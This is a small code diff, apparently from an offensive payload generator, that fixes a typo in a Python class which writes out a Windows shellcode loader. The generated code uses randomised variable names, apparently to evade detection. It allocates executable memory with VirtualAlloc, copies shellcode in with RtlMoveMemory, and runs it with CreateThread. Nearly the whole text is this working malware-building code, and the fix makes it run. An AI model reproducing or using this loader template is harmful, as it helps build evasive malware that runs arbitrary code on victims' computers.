@@ -83,7 +83,7 @@ class Payload:
                 payload_code += shellcode_variable_name + ' = bytearray(' + subbed_shellcode_variable_name + '.decode(\"string_escape\"))\n'
                 payload_code += rand_ptr + ' = ' + randctypes + '.windll.kernel32.VirtualAlloc(' + randctypes + '.c_int(0),' + randctypes + '.c_int(len(' + shellcode_variable_name + ')),' + randctypes + '.c_int(0x3000),' + randctypes + '.c_int(0x40))\n'
                 payload_code += rand_buf + ' = (' + randctypes + '.c_char * len(' + shellcode_variable_name + ')).from_buffer(' + shellcode_variable_name + ')\n'
-                payload_code += ranctypes + '.windll.kernel32.RtlMoveMemory(' + randctypes + '.c_int(' + rand_ptr + '),' + rand_buf + ',' + randctypes + '.c_int(len(' + shellcode_variable_name + ')))\n'
+                payload_code += randctypes + '.windll.kernel32.RtlMoveMemory(' + randctypes + '.c_int(' + rand_ptr + '),' + rand_buf + ',' + randctypes + '.c_int(len(' + shellcode_variable_name + ')))\n'
                 payload_code += rand_ht + ' = ' + randctypes + '.windll.kernel32.CreateThread(' + randctypes + '.c_int(0),' + randctypes + '.c_int(0),' + randctypes + '.c_int(' + rand_ptr + '),' + randctypes + '.c_int(0),' + randctypes + '.c_int(0),' + randctypes + '.pointer(' + randctypes + '.c_int(0)))\n'
                 payload_code += randctypes + '.windll.kernel32.WaitForSingleObject(' + randctypes + '.c_int(' + rand_ht + '),' + randctypes + '.c_int(-1))\n'
 
